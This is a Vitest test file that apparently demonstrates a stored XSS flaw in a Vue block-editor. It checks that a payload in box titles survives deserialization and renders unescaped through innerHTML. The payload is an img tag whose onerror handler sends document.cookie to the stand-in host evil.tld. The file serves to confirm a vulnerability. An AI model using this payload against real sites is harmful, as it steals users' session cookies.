import { describe, it, expect } from 'vitest'
import { Content, boxFactory } from '#block-editor'
import { createSSRApp, h } from 'vue'
import { renderToString } from 'vue/server-renderer'

const PAYLOAD = '<img src=x onerror="fetch(\'https://evil.tld/?c=\'+document.cookie)">'

describe('title XSS chain', () => {
  it('model keeps payload verbatim through deserialization', () => {
    const json = JSON.stringify([
      { name_type: 'TEXT_AREA', title: PAYLOAD, subtitle: PAYLOAD, value: 'ok' }
    ])
    const c = Content.fromJsonString(json, boxFactory)
    expect(c.boxes).toHaveLength(1)
    expect(c.boxes[0]!.title).toBe(PAYLOAD)
    expect(c.boxes[0]!.subtitle).toBe(PAYLOAD)
  })

  it('renders unescaped through the same v-html expression Container uses', async () => {
    const json = JSON.stringify([{ name_type: 'TEXT_AREA', title: PAYLOAD, value: 'ok' }])
    const box = Content.fromJsonString(json, boxFactory).boxes[0]!
    // mirrors Container.vue:148 exactly
    const app = createSSRApp({
      render: () => h('div', { class: 'text-sm font-semibold', innerHTML: box.title })
    })
    const html = await renderToString(app)
    console.log('RENDERED:', html)
    expect(html).toContain('onerror=')
    expect(html).not.toContain('&lt;img')
  })
})
